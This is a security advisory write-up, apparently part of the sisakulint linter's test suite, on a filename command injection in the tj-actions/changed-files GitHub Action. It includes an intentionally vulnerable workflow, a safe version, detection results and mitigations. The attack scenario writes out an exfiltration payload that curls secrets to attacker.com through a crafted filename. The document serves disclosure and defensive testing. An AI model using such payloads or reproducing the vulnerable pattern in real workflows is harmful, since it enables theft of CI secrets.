# GHSA-mcph-m25j-8j63: Command Injection via Filenames in tj-actions/changed-files

## Summary

| Field | Value |
|-------|-------|
| **Advisory ID** | GHSA-mcph-m25j-8j63 |
| **Package** | tj-actions/changed-files |
| **Severity** | High (CVSS 7.3) |
| **Vulnerability Type** | Command Injection (CWE-74, CWE-77) |
| **Affected Versions** | < 41 |
| **Fixed Version** | 41 |
| **Published** | 2024-01-12 |
| **Advisory URL** | https://github.com/advisories/GHSA-mcph-m25j-8j63 |

## Vulnerability Description

The `tj-actions/changed-files` action (versions < 41) is vulnerable to command injection through malicious filenames. The action returns lists of changed files in commits or pull requests. While it provides an `escape_json` input enabled by default, this only escapes `"` characters for JSON values and does not protect against shell injection.

**Technical Details:**
- CVSS Score: 7.3/10 (CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:H/I:H/A:N)
- CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component (Injection)
- CWE-77: Improper Neutralization of Special Elements used in a Command (Command Injection)
- EPSS: 0.673% (71st percentile probability of exploitation)
- Attack Complexity: Low with user interaction required

**Attack Vector:**
The vulnerability allows attackers to inject special characters like `;` and `` ` `` (backticks) in filenames. When these outputs are used directly in `run` blocks without proper escaping, arbitrary commands can execute on GitHub Runners. This could lead to secret theft (e.g., `GITHUB_TOKEN`) particularly when triggered on events other than `pull_request`, such as `push`.

**Proof of Concept:**
Creating a file named `$(whoami).txt` in a pull request would execute the `whoami` command when the workflow processes the filename, demonstrating command execution capability.

**The Fix (v41):**
The patch introduces a `safe_output` input enabled by default that escapes special characters like `;`, `` ` ``, `$`, `()` for bash environments. Commits:
- 0102c07446a3cad972f4afcbd0ee4dbc4b6d2d1b
- 716b1e13042866565e00e85fd4ec490e186c4a2f
- ff2f6e6b91913a7be42be1b5917330fe442f2ede

### Attack Scenario

1. Attacker forks the target repository
2. Creates or renames a file to include malicious payload: ``poc$(curl http://attacker.com/steal?s=$SECRET).txt``
3. Commits and creates a pull request
4. The `pull_request_target` workflow executes with base repository privileges
5. The `changed-files` action includes the malicious filename in its output
6. Subsequent steps use the filename without sanitization
7. Injected commands execute, potentially exfiltrating secrets

## Vulnerable Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  check-files:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Get changed files
        id: changed-files
        run: |
          ALL_CHANGED_FILES="src/main.go src/test.go"
          echo "all_changed_files=$ALL_CHANGED_FILES" >> "$GITHUB_OUTPUT"

      - name: Process files
        run: |
          # Vulnerable: Direct iteration without proper quoting
          for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
            echo "Linting: $file"
          done

      - name: Count files
        run: |
          # Vulnerable: Using output directly in command
          FILE_COUNT=$(echo "${{ steps.changed-files.outputs.all_changed_files }}" | wc -w)
          echo "Changed $FILE_COUNT files"
```

### Why This is Vulnerable

- Step outputs are substituted directly into shell commands
- `for` loop with unquoted expansion word-splits and glob-expands
- Filenames with spaces, backticks, `$()`, or semicolons can inject commands
- No sanitization or validation of filenames
- Privileged context amplifies the impact

## Safe Pattern

```yaml
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  check-files:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: read
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: Get changed files
        id: changed-files
        run: |
          ALL_CHANGED_FILES="src/main.go src/test.go"
          echo "all_changed_files=$ALL_CHANGED_FILES" >> "$GITHUB_OUTPUT"

      - name: Process files
        env:
          ALL_CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}
        run: |
          # Safe: Use environment variable with proper iteration
          while IFS= read -r file; do
            echo "Linting: $file"
          done <<< "$ALL_CHANGED_FILES"

      - name: Count files
        env:
          ALL_CHANGED_FILES: ${{ steps.changed-files.outputs.all_changed_files }}
        run: |
          # Safe: Use environment variable
          FILE_COUNT=$(echo "$ALL_CHANGED_FILES" | wc -w)
          echo "Changed $FILE_COUNT files"
```

### Why This is Safe

- Environment variables prevent command expansion during assignment
- `while IFS= read -r` properly handles filenames with special characters
- Here-string (`<<<`) safely passes input without shell expansion
- Filenames are treated as literal data
- No opportunity for command injection

## Detection in sisakulint

### Expected Rules

- **CodeInjectionCriticalRule** - Should detect unsafe usage of step outputs containing file lists in `pull_request_target` workflows

### Detection Result

```
(No vulnerability-specific warnings detected)
```

### Analysis

| Detected | Rule | Category Match |
|----------|------|----------------|
| No | CodeInjectionCriticalRule | No |

sisakulint did not detect the command injection pattern through filenames, which is at the core of this vulnerability. This is because the vulnerability occurs when step output values are used directly in the shell, making it difficult to detect through static analysis.

**Reasons for Non-Detection:**
1. Expression expansion like `${{ steps.changed-files.outputs.all_changed_files }}` occurs at workflow runtime
2. Special characters and command substitution syntax in filenames are unknown until runtime
3. Word splitting in loop constructs like `for file in ...` is dynamic shell behavior
4. The values that step outputs will have are unpredictable through static analysis

Test files:
- Vulnerable: `/Users/atsushi.sada/go/src/github.com/sisaku-security/sisakulint/script/actions/advisory/GHSA-mcph-m25j-8j63-vulnerable.yaml`
- Safe: `/Users/atsushi.sada/go/src/github.com/sisaku-security/sisakulint/script/actions/advisory/GHSA-mcph-m25j-8j63-safe.yaml`

### Verification Command

```bash
sisakulint script/actions/advisory/GHSA-mcph-m25j-8j63-vulnerable.yaml
sisakulint script/actions/advisory/GHSA-mcph-m25j-8j63-safe.yaml
```

## Mitigation Strategies

1. **Use Environment Variables** (Primary Defense)
   - Always pass step outputs through environment variables
   - Prevents shell expansion and command substitution

2. **Proper Shell Iteration**
   - Use `while IFS= read -r` instead of `for` loops with unquoted variables
   - Always quote variable references
   - Use here-strings or null-delimited input when possible

3. **Update to Fixed Version**
   - Upgrade to `tj-actions/changed-files@v42.0.0` or later
   - Fixed version properly escapes filenames in outputs

4. **Input Validation**
   - Validate filenames against expected patterns
   - Reject files with suspicious characters
   - Use allowlists for acceptable filename patterns

5. **Least Privilege**
   - Use `pull_request` trigger instead of `pull_request_target` when possible
   - Minimize permissions granted to jobs
   - Avoid exposing secrets to PR workflows

## References

- GitHub Advisory: https://github.com/advisories/GHSA-mcph-m25j-8j63
- Repository Security Advisory: https://github.com/tj-actions/changed-files/security/advisories/GHSA-mcph-m25j-8j63
- Security Patch Commits:
  - https://github.com/tj-actions/changed-files/commit/0102c07446a3cad972f4afcbd0ee4dbc4b6d2d1b
  - https://github.com/tj-actions/changed-files/commit/716b1e13042866565e00e85fd4ec490e186c4a2f
  - https://github.com/tj-actions/changed-files/commit/ff2f6e6b91913a7be42be1b5917330fe442f2ede
- tj-actions/changed-files Repository: https://github.com/tj-actions/changed-files
- CVE: CVE-2023-51664
- CWE-74: Improper Neutralization of Special Elements in Output Used by a Downstream Component
- CWE-77: Improper Neutralization of Special Elements used in a Command
- GitHub Security Lab: Command Injection in Actions
- Bash Pitfalls: Word Splitting
- Related sisakulint rules:
  - [Code Injection Rule](../codeinjectionrule.md)
